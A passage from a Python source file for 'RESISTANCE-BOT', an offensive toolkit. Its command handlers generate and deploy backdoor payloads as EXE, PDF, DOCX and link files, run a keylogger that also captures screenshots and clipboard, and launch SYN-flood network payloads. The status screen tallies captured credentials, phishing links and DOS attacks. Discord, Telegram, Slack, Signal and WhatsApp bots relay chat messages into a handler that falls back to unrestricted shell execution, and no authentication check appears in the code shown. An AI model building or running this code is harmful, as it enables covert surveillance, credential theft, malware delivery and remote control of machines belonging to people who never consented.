            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        
        output = f"🛡️ RESISTANCE-BOT IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        # Generate report if enabled
        if self.config.get('reporting.auto_generate', True) and self.report_gen:
            analysis_data = {
                'target': ip,
                'ping': ping_result.output,
                'location': location,
                'ports': nmap_result.output,
                'recommendations': ["Review open ports", "Check for vulnerabilities"]
            }
            self.report_gen.generate_analysis_report(analysis_data, ip)
        
        return {'success': True, 'output': output}
    
    # ==================== Domain Translation ====================
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            if self.domain_hosting:
                domain = self.domain_hosting.translate_ip_to_domain(ip)
                if domain:
                    return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            
            domain = self.tools.ip_to_domain(ip)
            if domain:
                return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
            return {'success': False, 'output': f"No domain found for IP {ip}"}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        domain = args[0]
        if self.domain_hosting:
            ip = self.domain_hosting.translate_domain_to_ip(domain)
            if ip:
                return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
        
        ip = self.tools.domain_to_ip(domain)
        if ip:
            return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
        return {'success': False, 'output': f"No IP found for domain {domain}"}
    
    def _host_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting not enabled'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        ip = args[0]
        domain = args[1]
        port = int(args[2]) if len(args) > 2 else 8080
        
        domain_host = self.domain_hosting.host_domain(ip, domain, port)
        if domain_host:
            return {'success': True, 'output': f"Domain {domain} hosted on IP {ip}:{port}"}
        return {'success': False, 'output': f"Failed to host domain {domain}"}
    
    def _host_website(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting not enabled'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
        domain = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            success = self.domain_hosting.host_website(domain, html_content)
            if success:
                return {'success': True, 'output': f"Website hosted on http://{domain}"}
            return {'success': False, 'output': f"Failed to host website on {domain}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting not enabled'}
        domains = self.domain_hosting.list_hosted_domains()
        if not domains:
            return {'success': True, 'output': 'No hosted domains'}
        output = "Hosted Domains:\n"
        for d in domains:
            status = "🟢 Active" if d['active'] else "🔴 Inactive"
            output += f"  • {d['domain']} -> {d['ip']} ({status})\n"
        return {'success': True, 'output': output}
    
    def _domain_info(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting not enabled'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_info <domain>'}
        domain = args[0]
        domains = self.domain_hosting.list_hosted_domains()
        for d in domains:
            if d['domain'] == domain:
                return {'success': True, 'output': json.dumps(d, indent=2)}
        return {'success': False, 'output': f"Domain {domain} not found"}
    
    # ==================== Payload Commands ====================
    def _payload_exe(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_exe(name)
        return {'success': True, 'output': f"EXE payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_pdf(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_pdf(name)
        return {'success': True, 'output': f"PDF payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_docx(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_docx(name)
        return {'success': True, 'output': f"DOCX payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_link(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_link(name)
        return {'success': True, 'output': f"Link payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_network(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if len(args) > 0 else f"payload_{int(time.time())}"
        target_ip = args[1] if len(args) > 1 else '127.0.0.1'
        target_port = int(args[2]) if len(args) > 2 else 80
        attack_type = args[3] if len(args) > 3 else 'syn'
        payload = self.payload_gen.generate_network_payload(name, target_ip, target_port, attack_type)
        return {'success': True, 'output': f"Network payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_list(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        payload_type = args[0] if args else None
        payloads = self.payload_gen.list_payloads(payload_type)
        if not payloads:
            return {'success': True, 'output': 'No payloads found'}
        output = "Payloads:\n"
        for p in payloads:
            output += f"  • {p['id']} - {p['name']} ({p['payload_type']}) - {p['deployment_count']} deployments\n"
        return {'success': True, 'output': output}
    
    def _payload_deploy(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_deploy <payload_id> <deployment_type> [target]'}
        payload_id = args[0]
        deployment_type = args[1]
        target = args[2] if len(args) > 2 else None
        result = self.payload_gen.deploy_payload(payload_id, deployment_type, target)
        return {'success': result.get('success', False), 'output': result.get('message', '')}
    
    # ==================== Keylogger Commands ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Report Commands ====================
    def _report_pdf(self, args: List[str]) -> Dict:
        if not self.report_gen:
            return {'success': False, 'output': 'Report generator not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: report_pdf <target>'}
        target = args[0]
        analysis_data = {'target': target, 'analysis': 'PDF Report'}
        report_path = self.report_gen.generate_pdf_report(analysis_data, target)
        if report_path:
            return {'success': True, 'output': f"PDF report generated: {report_path}"}
        return {'success': False, 'output': 'Failed to generate PDF report'}
    
    def _report_json(self, args: List[str]) -> Dict:
        if not self.report_gen:
            return {'success': False, 'output': 'Report generator not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: report_json <target>'}
        target = args[0]
        analysis_data = {'target': target, 'analysis': 'JSON Report'}
        report_path = self.report_gen.generate_json_report(analysis_data, target)
        if report_path:
            return {'success': True, 'output': f"JSON report generated: {report_path}"}
        return {'success': False, 'output': 'Failed to generate JSON report'}
    
    def _report_both(self, args: List[str]) -> Dict:
        if not self.report_gen:
            return {'success': False, 'output': 'Report generator not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: report_both <target>'}
        target = args[0]
        analysis_data = {'target': target, 'analysis': 'Both PDF and JSON Report'}
        reports = self.report_gen.generate_report(analysis_data, target)
        if reports:
            output = f"Reports generated for {target}:\n"
            for fmt, path in reports.items():
                output += f"  • {fmt.upper()}: {path}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate reports'}
    
    def _report_list(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        reports = self.db.get_reports(limit)
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "Reports:\n"
        for r in reports:
            output += f"  • {r['report_type']}: {r['report_path']} ({r['target'] or 'N/A'})\n"
        return {'success': True, 'output': output}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🛡️ RESISTANCE-BOT System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Registered Agents: {stats.get('total_agents', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Payloads: {stats.get('total_payloads', 0)}
  Reports: {stats.get('total_reports', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
  Lines of Code: {LINES_OF_CODE}
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
RESISTANCE-BOT: v{VERSION}, {LINES_OF_CODE} lines of code
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🛡️ RESISTANCE-BOT v{VERSION} - HELP MENU                         {Colors.PRIMARY}║
║{Colors.ACCENT}        {LINES_OF_CODE} Lines of Python Code                                   {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 NETWORK COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║  traceroute <target>           - Trace network path
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS lookup
║  nslookup <domain>             - NSLookup
║  location <ip>                 - IP geolocation
║
║{Colors.SUCCESS}🔍 SCAN COMMANDS:{Colors.RESET}
║  scan <target> [type]          - Run nmap scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan (all ports)
║  comprehensive_scan <target>   - Comprehensive scan
║  os_scan <target>              - OS detection scan
║  service_scan <target>         - Service version detection
║  udp_scan <target>             - UDP port scan
║  vuln_scan <target>            - Vulnerability scan
║  stealth_scan <target>         - Stealth SYN scan
║  snmp_scan <target>            - SNMP scan
║  smb_scan <target>             - SMB scan
║  ssh_scan <target>             - SSH scan
║
║{Colors.SUCCESS}🌐 WEB COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║  wget <url>                    - Download file
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Connect to host/port
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan with netcat
║
║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}🌐 DOMAIN TRANSLATION:{Colors.RESET}
║  ip_to_domain <ip>             - Translate IP to domain
║  domain_to_ip <domain>         - Translate domain to IP
║  host_domain <ip> <domain> [port] - Host a domain
║  host_website <domain> <html_file> - Host a website
║  list_domains                 - List hosted domains
║  domain_info <domain>         - Domain information
║
║{Colors.SUCCESS}💀 PAYLOAD COMMANDS:{Colors.RESET}
║  payload_exe <name>            - Generate EXE payload
║  payload_pdf <name>            - Generate PDF payload
║  payload_docx <name>           - Generate DOCX payload
║  payload_link <name>           - Generate Link payload
║  payload_network <name> <ip> <port> [type] - Generate Network payload
║  payload_list [type]           - List payloads
║  payload_deploy <id> <type> [target] - Deploy payload
║
║{Colors.SUCCESS}⌨️ KEYLOGGER COMMANDS:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.SUCCESS}📊 REPORT COMMANDS:{Colors.RESET}
║  report_pdf <target>           - Generate PDF report
║  report_json <target>          - Generate JSON report
║  report_both <target>          - Generate both PDF and JSON reports
║  report_list [limit]           - List generated reports
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
║  ping 8.8.8.8
║  quick_scan 192.168.1.1
║  curl https://example.com
║  analyze_ip 8.8.8.8
║  ip_to_domain 8.8.8.8
║  domain_to_ip google.com
║  payload_exe backdoor
║  payload_deploy <id> email target@example.com
║  keylogger_start
║  report_pdf 8.8.8.8
║
║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "discord.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Discord config error: {e}")
    
    def save_config(self, token: str, prefix: str = "!"):
        self.config = {"token": token, "prefix": prefix, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "discord.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Discord config error: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            logger.error("Discord.py not installed")
            return False
        if not self.config.get('token'):
            logger.error("Discord token not configured")
            return False
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                self.running = True
                await self.bot.change_presence(activity=discord.Activity(
                    type=discord.ActivityType.watching, 
                    name="🛡️ RESISTANCE-BOT | !help"
                ))
            
            @self.bot.event
            async def on_message(message):
                if message.author.bot:
                    return
                if message.content.startswith(self.config.get('prefix', '!')):
                    cmd = message.content[1:].strip()
                    result = self.handler.execute(cmd, f"discord/{message.author.name}")
                    output = result.get('output', '')
                    if len(output) > 1900:
                        output = output[:1900] + "...\n(truncated)"
                    embed = discord.Embed(
                        title="🛡️ RESISTANCE-BOT Response",
                        description=f"```{output}```",
                        color=0x1a73e8
                    )
                    embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                    await message.channel.send(embed=embed)
                await self.bot.process_commands(message)
            
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Start Discord bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            threading.Thread(target=self._run_discord_bot, daemon=True).start()
            logger.info("Discord bot started")
            return True
        return False
    
    def _run_discord_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

class TelegramBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "telegram.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Telegram config error: {e}")
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str = None):
        self.config = {"api_id": api_id, "api_hash": api_hash, "bot_token": bot_token, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "telegram.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Telegram config error: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            logger.error("Telethon not installed")
            return False
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            logger.error("Telegram API credentials not configured")
            return False
        try:
            self.client = TelegramClient('resistance_session', self.config['api_id'], self.config['api_hash'])
            
            @self.client.on(events.NewMessage)
            async def message_handler(event):
                if event.message.text and event.message.text.startswith('/'):
                    cmd = event.message.text[1:].strip()
                    result = self.handler.execute(cmd, f"telegram/{event.sender_id}")
                    output = result.get('output', '')
                    if len(output) > 4000:
                        output = output[:3900] + "\n... (truncated)"
                    await event.reply(f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*", parse_mode='markdown')
            
            await self.client.start(bot_token=self.config.get('bot_token'))
            logger.info("Telegram bot connected")
            self.running = True
            await self.client.run_until_disconnected()
            return True
        except Exception as e:
            logger.error(f"Start Telegram bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self._run_telegram_bot, daemon=True).start()
            logger.info("Telegram bot started")
            return True
        return False
    
    def _run_telegram_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

class SlackBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "slack.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Slack config error: {e}")
    
    def save_config(self, bot_token: str, app_token: str = None):
        self.config = {"bot_token": bot_token, "app_token": app_token, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "slack.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Slack config error: {e}")
            return False
    
    def start(self):
        if not SLACK_AVAILABLE:
            logger.error("Slack SDK not installed")
            return False
        if not self.config.get('bot_token'):
            logger.error("Slack bot token not configured")
            return False
        try:
            self.client = WebClient(token=self.config['bot_token'])
            if self.config.get('app_token'):
                socket_client = SocketModeClient(app_token=self.config['app_token'], web_client=self.client)
                @socket_client.socket_mode_request_listeners.append
                def process_events(client, req):
                    if req.type == "events_api":
                        event = req.payload.get("event", {})
                        if event.get("type") == "message" and event.get("text", "").startswith('!'):
                            cmd = event["text"][1:].strip()
                            result = self.handler.execute(cmd, f"slack/{event.get('user', 'unknown')}")
                            self.client.chat_postMessage(channel=event["channel"], text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*")
                socket_client.connect()
                logger.info("Slack bot connected")
                self.running = True
                while self.running:
                    time.sleep(1)
            return True
        except Exception as e:
            logger.error(f"Start Slack bot error: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("Slack bot started")
            return True
        return False

class SignalBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "signal.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Signal config error: {e}")
    
    def save_config(self, phone_number: str = None):
        self.config = {"phone_number": phone_number, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "signal.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Signal config error: {e}")
            return False
    
    def start(self):
        if not SIGNAL_AVAILABLE:
            logger.error("signal-cli not found")
            return False
        try:
            self.running = True
            threading.Thread(target=self._receive_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start Signal bot error: {e}")
            return False
    
    def _receive_messages(self):
        while self.running:
            try:
                receive_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'receive']
                result = subprocess.run(receive_cmd, capture_output=True, text=True, timeout=60)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Message:' in line:
                            parts = line.split('Message:')
                            if len(parts) > 1:
                                msg = parts[1].strip()
                                if msg.startswith('!'):
                                    cmd = msg[1:].strip()
                                    cmd_result = self.handler.execute(cmd, "signal")
                                    self._send_message(cmd_result.get('output', '')[:1000])
                time.sleep(5)
            except Exception as e:
                logger.error(f"Signal receive error: {e}")
                time.sleep(10)
    
    def _send_message(self, message: str):
        try:
            send_cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'send', '-m', message]
            subprocess.run(send_cmd, timeout=30)
        except Exception as e:
            logger.error(f"Signal send error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("Signal bot started")
            return True
        return False

class WhatsAppBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "whatsapp.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load WhatsApp config error: {e}")
    
    def save_config(self, phone_number: str = None):
        self.config = {"phone_number": phone_number, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "whatsapp.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save WhatsApp config error: {e}")
            return False
    
    def start(self):
        if not SELENIUM_AVAILABLE:
            logger.error("Selenium not installed")
            return False
        try:
            chrome_options = Options()
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=800,600")
            user_data_dir = os.path.join(CONFIG_DIR, "whatsapp_session")
            chrome_options.add_argument(f"--user-data-dir={user_data_dir}")
            if WEBDRIVER_MANAGER_AVAILABLE:
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.get("https://web.whatsapp.com")
            logger.info("WhatsApp Web opened. Please scan QR code.")
            self.running = True
            threading.Thread(target=self._monitor_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start WhatsApp bot error: {e}")
            return False
    
    def _monitor_messages(self):
        try:
            wait = WebDriverWait(self.driver, 30)
            while self.running:
                try:
                    messages = self.driver.find_elements(By.CSS_SELECTOR, "div.message-in")
                    for msg in messages:
                        try:
                            text_elem = msg.find_element(By.CSS_SELECTOR, "span.selectable-text")
                            text = text_elem.text
                            if text and text.startswith('/'):
                                cmd = text[1:].strip()
                                result = self.handler.execute(cmd, "whatsapp")
                                response = result.get('output', '')
                                if len(response) > 1000:
                                    response = response[:1000] + "..."
                                input_box = self.driver.find_element(By.CSS_SELECTOR, "div[contenteditable='true']")
                                input_box.send_keys(response)
